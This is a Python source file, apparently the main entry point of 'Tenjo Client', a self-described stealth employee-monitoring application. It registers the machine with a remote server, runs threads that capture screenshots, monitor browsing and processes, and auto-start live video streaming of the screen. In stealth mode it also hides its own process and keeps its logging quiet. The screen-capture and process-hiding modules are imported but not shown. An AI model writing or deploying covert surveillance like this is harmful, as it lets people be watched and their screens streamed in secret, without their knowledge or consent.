# Tenjo Client - Employee Monitoring Application
# Cross-platform stealth monitoring client

import sys
import os
import threading
import time
import json
import requests
from datetime import datetime
import logging
import signal
import platform

# Check for macOS-specific dependencies
if platform.system() == 'Darwin':
    try:
        import AppKit
        import Quartz
        MACOS_MODULES_AVAILABLE = True
    except ImportError:
        MACOS_MODULES_AVAILABLE = False
        # Only warn once at startup, not repeatedly
        logging.warning("macOS-specific modules not available (install pyobjc for full functionality)")
else:
    MACOS_MODULES_AVAILABLE = True

# Import modules
from src.core.config import Config
from src.modules.screen_capture import ScreenCapture
from src.modules.browser_monitor import BrowserMonitor
from src.modules.process_monitor import ProcessMonitor
from src.modules.stream_handler import StreamHandler
from src.utils.stealth import StealthManager
from src.utils.api_client import APIClient

# Global flag for graceful shutdown
shutdown_flag = False

def signal_handler(signum, frame):
    """Handle shutdown signals gracefully"""
    global shutdown_flag
    logging.info(f"Received signal {signum}, initiating graceful shutdown...")
    shutdown_flag = True

class TenjoClient:
    def __init__(self, stealth_mode=True):
        # Use API_ENDPOINT from config
        self.api_client = APIClient(Config.SERVER_URL, Config.CLIENT_ID)
        self.stealth_manager = StealthManager()
        self.stealth_mode = stealth_mode
        
        # Set up stealth logging if in stealth mode
        if stealth_mode:
            self._setup_stealth_logging()

        # Initialize modules
        self.screen_capture = ScreenCapture(self.api_client)
        self.browser_monitor = BrowserMonitor(self.api_client)
        self.process_monitor = ProcessMonitor(self.api_client)
        self.stream_handler = StreamHandler(self.api_client)

        # Setup logging
        self.setup_logging()

    def _setup_stealth_logging(self):
        """Setup logging for stealth mode - minimal output"""
        log_dir = os.path.join(os.path.dirname(__file__), "logs")
        os.makedirs(log_dir, exist_ok=True)
        
        log_file = os.path.join(log_dir, "stealth.log")
        
        # Remove any existing handlers
        for handler in logging.root.handlers[:]:
            logging.root.removeHandler(handler)
            
        # Setup file logging only
        logging.basicConfig(
            level=logging.WARNING,  # Only warnings and errors
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file)
            ]
        )

    def setup_logging(self):
        """Setup normal logging"""
        if self.stealth_mode:
            return  # Already set up in _setup_stealth_logging
            
        log_dir = Config.LOG_DIR

        logging.basicConfig(
            filename=Config.LOG_FILE,
            level=getattr(logging, Config.LOG_LEVEL),
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )

    def start_auto_video_streaming(self):
        """Start automatic video streaming without waiting for server requests"""
        try:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Auto-starting video streaming...")
            
            # Give a brief delay for initialization
            time.sleep(2)
            
            # Start video streaming directly
            self.stream_handler.start_video_streaming()
            
            # Still need to handle server requests in background
            while self.running:
                try:
                    # Check for any specific server requests in background
                    self.stream_handler.check_stream_requests()
                except Exception as e:
                    print(f"Error checking stream requests: {e}")
                
                time.sleep(5)  # Check every 5 seconds
                
        except Exception as e:
            print(f"Error in auto video streaming: {e}")

    def start_monitoring(self):
        """Start all monitoring services"""
        try:
            # Register client with server
            self.register_client()

            # Start monitoring threads
            threads = []

            # Screenshot thread (every 1 minute)
            screenshot_thread = threading.Thread(
                target=self.screen_capture.start_capture,
                daemon=True
            )
            threads.append(screenshot_thread)

            # Browser monitoring thread
            browser_thread = threading.Thread(
                target=self.browser_monitor.start_monitoring,
                daemon=True
            )
            threads.append(browser_thread)

            # Process monitoring thread
            process_thread = threading.Thread(
                target=self.process_monitor.start_monitoring,
                daemon=True
            )
            threads.append(process_thread)

            # Stream handler thread (with auto video streaming for production)
            if Config.AUTO_START_VIDEO_STREAMING:
                # Auto-start video streaming for production
                stream_thread = threading.Thread(
                    target=self.start_auto_video_streaming,
                    daemon=True
                )
            else:
                # Traditional mode - wait for server requests
                stream_thread = threading.Thread(
                    target=self.stream_handler.start_streaming,
                    daemon=True
                )
            threads.append(stream_thread)

            # Start all threads
            for thread in threads:
                thread.start()

            logging.info("Tenjo client started successfully")

            # Keep main thread alive
            while True:
                time.sleep(60)
                self.send_heartbeat()

        except Exception as e:
            logging.error(f"Error starting monitoring: {str(e)}")

    def register_client(self):
        """Register this client with the server"""
        import socket
        import platform
        
        client_info = {
            'client_id': Config.CLIENT_ID,
            'hostname': socket.gethostname(),
            'ip_address': 'auto-detect',  # Will be auto-detected by APIClient
            'username': Config.CLIENT_USER,
            'user': Config.CLIENT_USER,  # Send both fields for compatibility
            'os_info': {
                'name': platform.system(),
                'version': platform.release(),
                'architecture': platform.machine()
            },
            'timezone': 'Asia/Jakarta'
        }

        try:
            logging.info(f"Attempting to register client {Config.CLIENT_ID[:8]}... with server {Config.SERVER_URL}")
            response = self.api_client.register_client(client_info)
            if response and response.get('success'):
                logging.info(f"Client registered successfully with ID: {Config.CLIENT_ID[:8]}...")
                return True
            else:
                logging.error(f"Client registration failed: {response}")
                return False
        except Exception as e:
            logging.error(f"Error registering client: {str(e)}")
            return False

    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            data = {
                'client_id': Config.CLIENT_ID,
                'status': 'active',
                'timestamp': datetime.now().isoformat()
            }
            return self.api_client.post('/api/clients/heartbeat', data)
        except Exception as e:
            logging.error(f"Error sending heartbeat: {str(e)}")
            return None

    def stop(self):
        """Stop the client gracefully"""
        try:
            logging.info("Stopping Tenjo client...")
            # Stop individual modules if they have stop methods
            if hasattr(self.screen_capture, 'stop_capture'):
                self.screen_capture.stop_capture()
            # Add cleanup here
            logging.info("Client stopped successfully")
        except Exception as e:
            logging.error(f"Error stopping client: {str(e)}")


def main(stealth_mode=True):
    """Main entry point"""
    global shutdown_flag
    
    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    client = None
    try:
        # Check if running from stealth installation
        is_stealth = stealth_mode or 'stealth_main.py' in sys.argv[0] or len(sys.argv) > 1 and sys.argv[1] == '--stealth'
        
        client = TenjoClient(stealth_mode=is_stealth)
        
        if is_stealth:
            # Hide process in stealth mode
            client.stealth_manager.hide_process()
            logging.warning("Stealth monitoring service started")
        else:
            logging.info("Tenjo monitoring client started")

        # Start monitoring
        client.start_monitoring()
        
        # Keep running until shutdown signal
        while not shutdown_flag:
            try:
                # Send heartbeat every 5 minutes
                client.send_heartbeat()
                time.sleep(300)  # 5 minutes
            except KeyboardInterrupt:
                break
            except Exception as e:
                logging.error(f"Runtime error: {str(e)}")
                time.sleep(60)  # Wait before retrying

    except KeyboardInterrupt:
        logging.info("Client stopped by user")
    except Exception as e:
        logging.error(f"Unexpected error: {str(e)}")
        if not stealth_mode:
            print(f"Error: {str(e)}")
    finally:
        if client:
            client.stop()

if __name__ == "__main__":
    # Check for stealth flag
    stealth = '--stealth' in sys.argv
    main(stealth_mode=stealth)
